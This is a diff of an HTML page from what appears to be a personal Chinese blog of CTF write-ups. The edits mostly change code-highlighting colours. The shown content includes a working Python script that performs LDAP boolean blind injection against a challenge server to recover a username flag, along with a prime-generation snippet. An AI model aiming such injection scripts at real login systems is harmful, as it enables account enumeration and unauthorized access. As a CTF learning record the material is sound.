@@ -104,7 +104,7 @@
         
         
         <h1 class="site-name"><a href="/">茄子的养殖场</a></h1>
-        <h2 class="site-description">完成一个名为大学的作品</h2><ol class="social-menu">
+        <h2 class="site-description">完成一个名为人生的作品</h2><ol class="social-menu">
                 
                     <li>
                         <a 
@@ -361,28 +361,28 @@
 </h2><p>通过报错发现是ldap</p>
 <p>现学一波，没学明白</p>
 <p>LDAP查询语法</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search语法：attribute operator value
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search语法：attribute operator value
 </span></span><span style="display:flex;"><span>search filter options:( &#34;&amp;&#34; or &#34;|&#34; (filter1) (filter2) (filter3) ...) (&#34;!&#34; (filter))
 </span></span></code></pre></div><p>但是题目原因，可以通过布尔盲注来确定用户名</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://47.106.172.144:2333&#39;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://47.106.172.144:2333&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>flag, done <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;LDAP&#39;</span>, <span style="color:#ff79c6">False</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> done:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">33</span>, <span style="color:#bd93f9">127</span>):
-</span></span><span style="display:flex;"><span>        payload <span style="color:#ff79c6">=</span> flag <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(j) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;*&#39;</span>
-</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;user&#39;</span>: payload, <span style="color:#f1fa8c">&#39;pass&#39;</span>: <span style="color:#f1fa8c">&#39;123&#39;</span>}
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url, params<span style="color:#ff79c6">=</span>data)
+</span></span><span style="display:flex;"><span>flag, done <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;LDAP&#39;</span>, <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> done:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">127</span>):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> chr(j) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;user&#39;</span>: payload, <span style="color:#e6db74">&#39;pass&#39;</span>: <span style="color:#e6db74">&#39;123&#39;</span>}
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>data)
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;密码错误&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;查询用户不唯一&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text:
-</span></span><span style="display:flex;"><span>            flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(j)
-</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(flag)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
-</span></span><span style="display:flex;"><span>        done <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;密码错误&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;查询用户不唯一&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">+=</span> chr(j)
+</span></span><span style="display:flex;"><span>            print(flag)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        done <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;flag{&#39;</span> <span style="color:#ff79c6">+</span> flag<span style="color:#ff79c6">.</span>lower() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;}&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;flag{&#39;</span> <span style="color:#f92672">+</span> flag<span style="color:#f92672">.</span>lower() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span>)
 </span></span></code></pre></div><p>还就跑出来了</p>
 <h3 id="misc">MISC
 </h3><h2 id="签到签到">[签到]签到
@@ -423,20 +423,20 @@
 <p>CLCKOUTHK</p>
 <h2 id="萌新素数">[萌新]素数
 </h2><p>10个不重复的长度&gt;=1024bits的素数</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> gmpy2
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> gmpy2 <span style="color:#ff79c6">import</span> mpz
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> mpz
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>rs <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>random_state()
+</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>random_state()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">gen_prime</span>():
-</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>mpz_urandomb(rs, <span style="color:#bd93f9">1024</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> gmpy2<span style="color:#ff79c6">.</span>is_prime(p):
-</span></span><span style="display:flex;"><span>        p <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>add(p, <span style="color:#bd93f9">1</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> p
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_prime</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>mpz_urandomb(rs, <span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> gmpy2<span style="color:#f92672">.</span>is_prime(p):
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>add(p, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
-</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> gen_prime()
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(p)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> gen_prime()
+</span></span><span style="display:flex;"><span>    print(p)
 </span></span></code></pre></div><p>多弄几遍，有时候生成的数不是309位整数</p>
 
 </section>
